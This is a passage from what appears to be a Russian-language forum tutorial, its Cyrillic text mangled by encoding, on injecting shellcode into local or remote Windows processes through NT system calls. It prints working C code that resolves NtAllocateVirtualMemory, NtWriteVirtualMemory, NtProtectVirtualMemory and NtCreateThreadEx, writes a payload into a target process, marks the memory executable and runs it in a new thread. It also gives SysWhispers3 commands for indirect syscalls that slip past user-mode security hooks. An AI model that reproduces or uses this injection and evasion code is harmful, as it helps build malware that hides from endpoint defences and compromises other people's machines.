	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtWriteVirtualMemory(
  IN HANDLE               ProcessHandle,          // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –ø–∞–º—è—Ç—å –∫–æ—Ç–æ—Ä–æ–≥–æ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –∑–∞–ø–∏—Å–∞–Ω–∞
  IN PVOID                BaseAddress,            // –ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ, –≤ –∫–æ—Ç–æ—Ä—ã–π –∑–∞–ø–∏—Å—ã–≤–∞—é—Ç—Å—è –¥–∞–Ω–Ω—ã–µ
  IN PVOID                Buffer,                 // –î–∞–Ω–Ω—ã–µ –¥–ª—è –∑–∞–ø–∏—Å–∏
  IN ULONG                NumberOfBytesToWrite,   // –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∞–π—Ç–æ–≤ –¥–ª—è –∑–∞–ø–∏—Å–∏
  OUT PULONG              NumberOfBytesWritten    // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø–∏—Å–∞–Ω–Ω—ã—Ö –±–∞–π—Ç–æ–≤
);</code></pre>
	</div>
</div><br />
–ü–∞—Ä–∞–º–µ—Ç—Ä—ã NtWriteVirtualMemory —Ç–∞–∫–∏–µ –∂–µ, –∫–∞–∫ –∏ —É –µ–≥–æ –≤–µ—Ä—Å–∏–∏ WinAPI, WriteProcessMemory.<br />
<br />
<b>NtCreateThreadEx</b><br />
<br />
–≠—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏–∑ WinAPI-—Ñ—É–Ω–∫—Ü–∏–π CreateThread, CreateRemoteThread –∏ CreateRemoteThreadEx. NtCreateThreadEx –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtCreateThreadEx(
    OUT PHANDLE                 ThreadHandle,         // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é HANDLE, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞
    IN     ACCESS_MASK             DesiredAccess,        // –ü—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ—Ç–æ–∫—É (—É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –≤ THREAD_ALL_ACCESS - 0x1FFFFF)
    IN     POBJECT_ATTRIBUTES      ObjectAttributes,     // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É OBJECT_ATTRIBUTES (—É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ NULL)
    IN     HANDLE                  ProcessHandle,        // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –≤ –∫–æ—Ç–æ—Ä–æ–º –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å–æ–∑–¥–∞–Ω –ø–æ—Ç–æ–∫
    IN     PVOID                   StartRoutine,         // –ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –æ–ø—Ä–µ–¥–µ–ª—è–µ–º–æ–π –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è
    IN     PVOID                   Argument,             // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∫–æ—Ç–æ—Ä–∞—è –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ—Ç–æ–∫–∞ (—É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ NULL)
    IN     ULONG                   CreateFlags,          // –§–ª–∞–≥–∏, –∫–æ—Ç–æ—Ä—ã–µ —É–ø—Ä–∞–≤–ª—è—é—Ç —Å–æ–∑–¥–∞–Ω–∏–µ–º –ø–æ—Ç–æ–∫–∞ (—É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –≤ NULL)
    IN     SIZE_T                  ZeroBits,             // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –≤ NULL
    IN     SIZE_T                  StackSize,            // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –≤ NULL
    IN     SIZE_T                  MaximumStackSize,     // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –≤ NULL
    IN     PPS_ATTRIBUTE_LIST      AttributeList         // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É PS_ATTRIBUTE_LIST (—É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –≤ NULL)
);</code></pre>
	</div>
</div><br />
NtCreateThreadEx –ø–æ—Ö–æ–∂ –Ω–∞ WinAPI —Ñ—É–Ω–∫—Ü–∏—é CreateRemoteThreadEx. NtCreateThreadEx - —ç—Ç–æ –æ—á–µ–Ω—å –≥–∏–±–∫–∏–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –∏ –º–æ–∂–µ—Ç –ø–æ–∑–≤–æ–ª–∏—Ç—å —Å–ª–æ–∂–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–æ–∑–¥–∞–Ω–Ω—ã–º–∏ –ø–æ—Ç–æ–∫–∞–º–∏. –û–¥–Ω–∞–∫–æ –¥–ª—è –Ω–∞—à–∏—Ö —Ü–µ–ª–µ–π –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –µ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –±—É–¥—É—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã –Ω–∞ NULL.<br />
<br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º GetProcAddress –∏ GetModuleHandle</b><br />
<br />
–í—ã–∑–æ–≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –º–µ—Ç–æ–¥–æ–≤, –Ω–∞—á–∏–Ω–∞—è —Å –æ–±—ã—á–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–º–∏ WinAPI-—Ñ—É–Ω–∫—Ü–∏—è–º–∏ GetProcAddress –∏ GetModuleHandle. –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –ø—Ä–æ—Å—Ç –∏ –±—ã–ª –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –º–Ω–æ–≥–æ–∫—Ä–∞—Ç–Ω–æ –¥–ª—è –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–≥–æ –≤—ã–∑–æ–≤–∞ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –û–¥–Ω–∞–∫–æ, –∫–∞–∫ —É–∂–µ –æ–±—Å—É–∂–¥–∞–ª–æ—Å—å —Ä–∞–Ω–µ–µ, —ç—Ç–æ—Ç –º–µ—Ç–æ–¥ –Ω–µ –æ–±—Ö–æ–¥–∏—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ —Ö—É–∫–∏, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –Ω–∞ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã.<br />
<br />
–í –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–º —Å–æ–∑–¥–∞–µ—Ç—Å—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ Syscall –∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é InitializeSyscallStruct, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç –∞–¥—Ä–µ—Å–∞ –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –°—Ç—Ä—É–∫—Ç—É—Ä–∞, –∫–æ—Ç–æ—Ä–∞—è —Ö—Ä–∞–Ω–∏—Ç –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã
typedef struct _Syscall {

    fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
    fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
    fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
    fnNtCreateThreadEx        pNtCreateThreadEx;

} Syscall, *PSyscall;


// –§—É–Ω–∫—Ü–∏—è, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã &#039;St&#039;
BOOL InitializeSyscallStruct (OUT PSyscall St) {

    HMODULE hNtdll = GetModuleHandle(L&quot;NTDLL.DLL&quot;);
    if (!hNtdll) {
        printf(&quot;[!] GetModuleHandle Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    St-&gt;pNtAllocateVirtualMemory  = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);
    St-&gt;pNtProtectVirtualMemory   = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, &quot;NtProtectVirtualMemory&quot;);
    St-&gt;pNtWriteVirtualMemory     = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);
    St-&gt;pNtCreateThreadEx         = (fnNtCreateThreadEx)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);

        // –ø—Ä–æ–≤–µ—Ä–∫–∞, –ø—Ä–æ–ø—É—Å—Ç–∏–ª –ª–∏ GetProcAddress —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤
    if (St-&gt;pNtAllocateVirtualMemory == NULL || St-&gt;pNtProtectVirtualMemory == NULL || St-&gt;pNtWriteVirtualMemory == NULL || St-&gt;pNtCreateThreadEx == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
–î–∞–ª–µ–µ —Ñ—É–Ω–∫—Ü–∏—è ClassicInjectionViaSyscalls –±—É–¥–µ—Ç –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–∞ –∑–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, pPayload, –≤ —Ü–µ–ª–µ–≤–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ, hProcess. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç FALSE, –µ—Å–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –∏ TRUE, –µ—Å–ª–∏ —É–¥–∞–ª–æ—Å—å. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Ñ—É–Ω–∫—Ü–∏—è –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –∏–Ω—ä–µ–∫—Ü–∏–∏ –∫–∞–∫ –≤ –ª–æ–∫–∞–ª—å–Ω—ã–µ, —Ç–∞–∫ –∏ –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã, –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –∑–Ω–∞—á–µ–Ω–∏—è hProcess.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {


    Syscall   St                     = { 0 };
    NTSTATUS  STATUS                 = 0x00;
    PVOID     pAddress               = NULL;
    ULONG     uOldProtection         = NULL;

    SIZE_T    sSize                  = sPayloadSize,
              sNumberOfBytesWritten    = NULL;
    HANDLE    hThread                = NULL;

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã &#039;St&#039; –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–æ–≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤
    if (!InitializeSyscallStruct(&amp;St)){
        printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
        return FALSE;
    }

//--------------------------------------------------------------------------

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏
    if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();

//--------------------------------------------------------------------------

    // –ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

    // –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –ø–∞–º—è—Ç–∏ –Ω–∞ RWX
    if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —á–µ—Ä–µ–∑ –ø–æ—Ç–æ–∫
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–†–∞–∑–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –æ–∫—Ä—É–≥–ª–µ–Ω–∏–µ –≤ –±–æ–ª—å—à—É—é —Å—Ç–æ—Ä–æ–Ω—É</b><br />
<br />
–ü–æ–º–Ω–∏—Ç–µ, —á—Ç–æ NtAllocateVirtualMemory –æ–∫—Ä—É–≥–ª—è–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ RegionSize –¥–æ –∫—Ä–∞—Ç–Ω–æ–≥–æ 4096. –ò–∑-–∑–∞ –æ–∫—Ä—É–≥–ª–µ–Ω–∏—è —Ä–∞–∑–º–µ—Ä–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –±—ã—Ç—å –æ—Å—Ç–æ—Ä–æ–∂–Ω—ã–º –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –æ–¥–Ω–æ–π –∏ —Ç–æ–π –∂–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π —Ä–∞–∑–º–µ—Ä–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –ø—Ä–∏ –≤—ã–¥–µ–ª–µ–Ω–∏–∏ –ø–∞–º—è—Ç–∏ –∏ –∑–∞–ø–∏—Å–∏ –≤ –ø–∞–º—è—Ç—å, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –∑–∞–ø–∏—Å–∏ –±–æ–ª—å—à–µ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –±–∞–π—Ç–æ–≤, —á–µ–º –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–ª–æ—Å—å. –ò–º–µ–Ω–Ω–æ –ø–æ—ç—Ç–æ–º—É –≤ –≤—ã—à–µ–ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –∫–æ–¥–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —Ä–∞–∑–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ —Ä–∞–∑–º–µ—Ä–∞ –¥–ª—è NtAllocateVirtualMemory –∏ NtWriteVirtualMemory.<br />
<br />
–ü—Ä–æ–±–ª–µ–º–∞ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è –≤ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ –∫–æ–¥–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>  // sPayloadSize - —ç—Ç–æ —Ä–∞–∑–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ (272 –±–∞–π—Ç–∞)
  // –í—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏
  if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
    return FALSE;
  }

  // –∑–Ω–∞—á–µ–Ω–∏–µ sPayloadSize —Ç–µ–ø–µ—Ä—å —Ä–∞–≤–Ω–æ 4096
  // –ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —Å sPayloadSize (NumberOfBytesToWrite) —Ä–∞–≤–Ω—ã–º 4096 –≤–º–µ—Å—Ç–æ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞
  if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0) {
    return FALSE;
  }</code></pre>
	</div>
</div><br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º SysWhispers3</b><br />
<br />
–†–µ–∞–ª–∏–∑–∞—Ü–∏—è –∑–¥–µ—Å—å –∏—Å–ø–æ–ª—å–∑—É–µ—Ç<a href="https://github.com/klezVirus/SysWhispers3" target="_blank" class="link link--external" rel="noopener"> SysWhispers3</a> –¥–ª—è –æ–±—Ö–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö —Ö—É–∫–æ–≤ <b>—á–µ—Ä–µ–∑ –∫–æ—Å–≤–µ–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã.</b> –°–ª–µ–¥—É—é—â–∞—è –∫–æ–º–∞–Ω–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö —Ñ–∞–π–ª–æ–≤ –¥–ª—è —ç—Ç–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o SysWhispers -v</code></pre>
	</div>
</div><br />
–°–æ–∑–¥–∞—é—Ç—Å—è —Ç—Ä–∏ —Ñ–∞–π–ª–∞: SysWhispers.h, SysWhispers.c –∏ SysWhispers-asm.x64.asm.<br />
<br />
–°–ª–µ–¥—É—é—â–∏–π —à–∞–≥ - –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å —ç—Ç–∏ —Ñ–∞–π–ª—ã –≤ Visual Studio, –∫–∞–∫ —É–∫–∞–∑–∞–Ω–æ –≤ Readme SysWhisper.<br />
<br />
–®–∞–≥–∏ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É—é—Ç—Å—è –Ω–∏–∂–µ.<br />
<br />
<b>–®–∞–≥ 1</b> –°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã –≤ –ø–∞–ø–∫—É –ø—Ä–æ–µ–∫—Ç–∞, –∑–∞—Ç–µ–º –¥–æ–±–∞–≤—å—Ç–µ –∏—Ö –≤ –ø—Ä–æ–µ–∫—Ç Visual Studio –∫–∞–∫ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ —ç–ª–µ–º–µ–Ω—Ç—ã.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786750819.png"
		data-src="https://osint42.org/attachments/1746786750819-png.228/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786750819-png.228/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786750819.png"
			title="1746786750819.png"
			width="779" height="553" loading="lazy" />
	</div><br />
<br />
<b>–®–∞–≥ 2</b> –í–∫–ª—é—á–∏—Ç–µ MASM –≤ –ø—Ä–æ–µ–∫—Ç–µ, —á—Ç–æ–±—ã —Ä–∞–∑—Ä–µ—à–∏—Ç—å –∫–æ–º–ø–∏–ª—è—Ü–∏—é —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∫–æ–¥–∞ –Ω–∞ –∞—Å—Å–µ–º–±–ª–µ—Ä–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786757113.png"
		data-src="https://osint42.org/attachments/1746786757113-png.229/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786757113-png.229/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786757113.png"
			title="1746786757113.png"
			width="785" height="720" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786763384.png"
		data-src="https://osint42.org/attachments/1746786763384-png.230/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786763384-png.230/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786763384.png"
			title="1746786763384.png"
			width="777" height="634" loading="lazy" />
	</div><br />
<br />
<b>–®–∞–≥ 3</b> –ò–∑–º–µ–Ω–∏—Ç–µ —Å–≤–æ–π—Å—Ç–≤–∞, —á—Ç–æ–±—ã —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ–∞–π–ª ASM –Ω–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏—é —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Microsoft Macro Assembler.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786769176.png"
		data-src="https://osint42.org/attachments/1746786769176-png.231/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786769176-png.231/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786769176.png"
			title="1746786769176.png"
			width="803" height="680" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786775047.png"
		data-src="https://osint42.org/attachments/1746786775047-png.232/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786775047-png.232/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786775047.png"
			title="1746786775047.png"
			width="809" height="580" loading="lazy" />
	</div><br />
<br />
<b>–®–∞–≥ 4</b> –¢–µ–ø–µ—Ä—å –ø—Ä–æ–µ–∫—Ç Visual Studio –º–æ–∂–µ—Ç –±—ã—Ç—å —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω. –§—É–Ω–∫—Ü–∏—è ClassicInjectionViaSyscalls –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



